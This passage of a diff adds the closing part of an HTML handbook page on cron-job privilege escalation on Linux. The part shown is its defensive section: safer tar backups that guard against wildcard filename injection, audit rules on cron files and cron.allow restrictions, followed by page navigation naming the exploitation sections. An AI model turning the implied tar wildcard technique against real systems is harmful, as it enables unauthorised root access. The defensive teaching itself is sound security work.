+tar<span class="w"> </span>-czf<span class="w"> </span>backup.tgz<span class="w"> </span>/var/www/*
+
+<span class="c1"># Better</span>
+tar<span class="w"> </span>-czf<span class="w"> </span>backup.tgz<span class="w"> </span>/var/www<span class="w"> </span>--<span class="w">  </span><span class="c1"># Still risky</span>
+
+<span class="c1"># Best</span>
+tar<span class="w"> </span>-czf<span class="w"> </span>backup.tgz<span class="w"> </span>/var/www/html<span class="w"> </span>/var/www/images
+</code></pre></div>
+</li>
+<li>
+<p><strong>Use <code>--</code> to End Options</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">tar<span class="w"> </span>-czf<span class="w"> </span>backup.tgz<span class="w"> </span>--<span class="w"> </span>/var/www/*<span class="w">  </span><span class="c1"># Ignores filenames starting with -</span>
+</code></pre></div>
+</li>
+<li>
+<p><strong>Separate Cron Directories</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Use separate directory for cron scripts</span>
+mkdir<span class="w"> </span>/opt/cron_scripts/
+chown<span class="w"> </span>root:root<span class="w"> </span>/opt/cron_scripts/
+chmod<span class="w"> </span><span class="m">750</span><span class="w"> </span>/opt/cron_scripts/
+</code></pre></div>
+</li>
+<li>
+<p><strong>Monitor and Alert</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Audit cron changes</span>
+auditctl<span class="w"> </span>-w<span class="w"> </span>/etc/crontab<span class="w"> </span>-p<span class="w"> </span>wa<span class="w"> </span>-k<span class="w"> </span>cron_change
+auditctl<span class="w"> </span>-w<span class="w"> </span>/etc/cron.d/<span class="w"> </span>-p<span class="w"> </span>wa<span class="w"> </span>-k<span class="w"> </span>cron_change
+
+<span class="c1"># Email alerts on changes</span>
+<span class="c1"># Use AIDE/Tripwire for integrity checking</span>
+</code></pre></div>
+</li>
+<li>
+<p><strong>Restrict Cron Access</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Allow only specific users</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">"root"</span><span class="w"> </span>&gt;<span class="w"> </span>/etc/cron.allow
+<span class="nb">echo</span><span class="w"> </span><span class="s2">"admin"</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/cron.allow
+</code></pre></div>
+</li>
+</ol>
+</div>
+      <p class="g-source-note">Privilege Escalation handbook: Part 04 of 10. Adapted from <a href="https://github.com/JoramMalley/Linux-privilege-escalation" target="_blank" rel="noopener noreferrer">JoramMalley's Linux privilege escalation notes</a> and corrected where public advisories differ. Verify every version, CVE and command against vendor documentation. Use only in labs, CTFs or systems you own and have written permission to test.</p>
+      <div class="g-foundation-cta">
+        <div>
+          <p class="g-kicker">Apply it</p>
+          <strong>Automate the enumeration.</strong>
+          <p>Chapter 26 turns these checks into a repeatable collection and validation pass.</p>
+        </div>
+        <a class="g-btn primary" href="../chapters/26-automating-linux-privilege-escalation-checks.html">
+          Open Chapter 26 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 12h14"/><path d="m13 6 6 6-6 6"/></svg>
+        </a>
+      </div>
+      <nav class="g-chapter-nav" aria-label="Privilege escalation navigation"><a class="g-chapter-card" href="../privesc/03-linux-capabilities.html" data-prev-privesc><span class="g-chapter-card-label">Previous / Part 03</span><strong>Linux Capabilities</strong></a><a class="g-chapter-card" href="../privesc/05-writable-system-files.html" data-next-privesc><span class="g-chapter-card-label">Next / Part 05</span><strong>Writable System Files</strong></a></nav>
+    </article>
+  </main>
+  
+<aside class="g-toc" aria-label="On this page">
+  <div class="g-toc-inner">
+    <p class="g-toc-kicker">On this page</p>
+    <nav class="g-toc-nav"><a class="g-toc-link depth-2" href="#cron-jobs-for-privilege-escalation" data-toc-link>Cron Jobs for Privilege Escalation</a><a class="g-toc-link depth-3" href="#1-understanding-cron" data-toc-link>1. Understanding Cron</a><a class="g-toc-link depth-3" href="#2-enumeration-finding-cron-jobs" data-toc-link>2. Enumeration: Finding Cron Jobs</a><a class="g-toc-link depth-3" href="#3-exploitation-vectors" data-toc-link>3. Exploitation Vectors</a><a class="g-toc-link depth-3" href="#4-automated-exploitation" data-toc-link>4. Automated Exploitation</a><a class="g-toc-link depth-3" href="#5-advanced-techniques" data-toc-link>5. Advanced Techniques</a><a class="g-toc-link depth-3" href="#6-defensive-measures" data-toc-link>6. Defensive Measures</a></nav>
+    <div class="g-toc-foot">Part 04 / 7 sections</div>
+  </div>
+</aside>
+</div>
+<footer class="g-site-foot g-docs-foot">
+  <div class="g-foot-main">
+    <span>0XMAP field guide / 30 chapters / 2 companion handbooks</span>
+    <span>Created by 0xbit</span>
+  </div>
+  <div class="g-foot-links">
+    <a href="../index.html">Home</a>
+    <a href="../index.html#foundations">Foundations</a>
+    <a href="../index.html#privesc">Privilege escalation</a>
+    <a href="../index.html#chapters">Chapters</a>
+    <button type="button" class="g-link-btn" data-search-open>Search</button>
+  </div>
+</footer>
+  
+<div class="g-search" data-search-modal hidden>
+  <div class="g-search-panel" role="dialog" aria-modal="true" aria-labelledby="g-search-title">
+    <div class="g-search-top">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="6.5"/><path d="m16 16 4 4"/></svg>
+      <label class="g-visually-hidden" for="g-search-input" id="g-search-title">Search the guide</label>
+      <input class="g-search-input" id="g-search-input" data-search-input type="search"
+             placeholder="Search chapters, handbooks and commands..." autocomplete="off" spellcheck="false">
+      <kbd>Esc</kbd>
+      <button type="button" class="g-icon-btn" data-search-close aria-label="Close search">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 6l12 12M18 6 6 18"/></svg>
+      </button>
+    </div>
+    <div class="g-search-results" data-search-results></div>
+    <div class="g-search-foot">
+      <span><kbd>Up</kbd><kbd>Down</kbd> to move</span>
+      <span><kbd>Enter</kbd> to open</span>
+      <span data-search-count></span>
+    </div>
+  </div>
+</div>
+  <script src="../static/guide-data.js"></script>
+  <script src="../static/guide.js" defer></script>
+</body>
+</html>
